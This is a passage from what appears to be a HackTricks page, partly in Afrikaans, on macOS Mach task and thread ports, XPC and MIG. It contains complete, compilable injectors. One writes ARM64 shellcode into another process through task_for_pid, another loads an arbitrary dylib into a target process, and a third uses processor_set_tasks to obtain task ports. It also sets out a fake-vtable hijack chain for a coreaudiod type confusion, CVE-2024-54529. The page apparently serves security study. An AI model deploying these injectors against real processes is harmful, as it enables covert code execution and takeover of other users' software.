- Dit is die beperkings op toegang tot die poort (uit `macos_task_policy` van die binary `AppleMobileFileIntegrity`):
- As die app **`com.apple.security.get-task-allow` entitlement** het, kan processes van **dieselfde user toegang tot die task-poort verkry** (gewoonlik deur Xcode vir debugging bygevoeg). Die **notarization**-proses sal dit nie vir production releases toelaat nie.
- Apps met die **`com.apple.system-task-ports`** entitlement kan die **task-poort vir enige** process verkry, behalwe die kernel. In ouer weergawes is dit **`task_for_pid-allow`** genoem. Dit word slegs aan Apple-apps toegestaan.
- **Root kan toegang tot task-poorte verkry** van apps wat nie met 'n **hardened** runtime gekompileer is nie (en nie van Apple afkomstig is nie).

**Die task name-poort:** 'n Onbevoorregte weergawe van die _task-poort_. Dit verwys na die task, maar laat nie toe dat dit beheer word nie. Die enigste ding wat blykbaar daardeur beskikbaar is, is `task_info()`.

### Thread-poorte

Threads het ook geassosieerde poorte, wat sigbaar is vanaf die task wat **`task_threads`** aanroep en vanaf die processor met `processor_set_threads`. 'n SEND right na die thread-poort laat toe dat die funksies van die `thread_act`-subsystem gebruik word, soos:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Enige thread kan hierdie poort verkry deur **`mach_thread_sef`** aan te roep.

### Shellcode Injection in thread via Task-poort

Jy kan shellcode verkry vanaf:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Kompileer** die vorige program en voeg die **entitlements** by om code met dieselfde gebruiker te kan inspuit (anders sal jy **sudo** moet gebruik).<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Om dit op iOS te laat werk, benodig jy die entitlement `dynamic-codesigning` om uitvoerbare skryfbare geheue te kan maak.

### Dylib Injection in thread via Task port

In macOS kan **threads** deur middel van **Mach** of die **posix `pthread` api** gemanipuleer word. Die thread wat ons in die vorige injection gegenereer het, is deur die Mach api gegenereer, dus is dit **nie posix-versoenbaar nie**.

Dit was moontlik om **eenvoudige shellcode te inject** om ’n opdrag uit te voer omdat dit **nie met posix-versoenbare apis hoef te werk nie**, maar slegs met Mach. **Meer komplekse injections** sal vereis dat die **thread** ook **posix-versoenbaar** is.

Om die **thread te verbeter**, moet dit daarom **`pthread_create_from_mach_thread`** aanroep, wat ’n **geldige pthread** sal skep. Hierdie nuwe pthread kan dan **dlopen** aanroep om ’n **dylib** vanaf die stelsel te **laai**, sodat dit moontlik is om pasgemaakte biblioteke te laai in plaas daarvan om nuwe shellcode te skryf om verskillende aksies uit te voer.<sup>[[2]](#references)</sup>

Jy kan **voorbeeld-dylibs** vind in (byvoorbeeld die een wat ’n log genereer waarna jy dan kan luister):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In hierdie tegniek word ’n thread van die proses gekaap:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

Wanneer `task_for_pid` of `thread_create_*` geroep word, word ’n teller in die `task`-struktuur vanaf die kernel verhoog. Dit kan vanuit user mode verkry word deur `task_info(task, TASK_EXTMOD_INFO, ...)` te roep.

## Exception Ports

Wanneer ’n exception in ’n thread voorkom, word hierdie exception na die aangewese exception-port van die thread gestuur. Indien die thread dit nie hanteer nie, word dit na die task se exception-ports gestuur. Indien die task dit nie hanteer nie, word dit na die host-port gestuur wat deur launchd bestuur word, waar dit erken sal word. Dit word exception triage genoem.

Let daarop dat die verslag gewoonlik aan die einde, indien dit nie behoorlik hanteer word nie, deur die ReportCrash-daemon hanteer sal word. Dit is egter moontlik dat ’n ander thread in dieselfde task die exception hanteer; dit is wat crash reporting tools soos `PLCreashReporter` doen.

## Other Objects

### Clock

Enige user kan toegang tot inligting oor die clock verkry, maar om die tyd in te stel of ander instellings te wysig, moet ’n mens root wees.

Om inligting te verkry, is dit moontlik om funksies vanaf die `clock`-subsystem te roep, soos: `clock_get_time`, `clock_get_attributtes` of `clock_alarm`\
Om waardes te wysig, kan die `clock_priv`-subsystem gebruik word met funksies soos `clock_set_time` en `clock_set_attributes`

### Processors and Processor Set

Die processor-API’s laat beheer oor ’n enkele logiese processor toe deur funksies soos `processor_start`, `processor_exit`, `processor_info` en `processor_get_assignment`.

Verder bied die **processor set**-API’s ’n manier om verskeie processors in ’n groep te groepeer. Dit is moontlik om die verstek-processor set te verkry deur **`processor_set_default`** te roep.\
Hier is ’n paar interessante API’s om met die processor set te kommunikeer:

- `processor_set_statistics`
- `processor_set_tasks`: Return ’n array van send rights na alle tasks binne die processor set
- `processor_set_threads`: Return ’n array van send rights na alle threads binne die processor set
- `processor_set_stack_usage`
- `processor_set_info`

Soos in [**hierdie plasing**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/) genoem, het dit in die verlede toegelaat dat die voorheen genoemde beskerming omseil word om task-ports in ander prosesse te verkry en hulle te beheer deur **`processor_set_tasks`** te roep en ’n host-port op elke proses te kry.<sup>[[10]](#references)</sup>\
Vandag het jy root nodig om daardie funksie te gebruik, en dit word beskerm sodat jy slegs hierdie ports op onbeskermde prosesse sal kan verkry.<sup>[[10]](#references)</sup>

Jy kan dit probeer met:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Main part of the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[[9]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirekte oproep deur vtable-gleuf
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [7] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [8] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [9] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [10] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)
- [11] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)

{{#include ../../../../banners/hacktricks-training.md}}
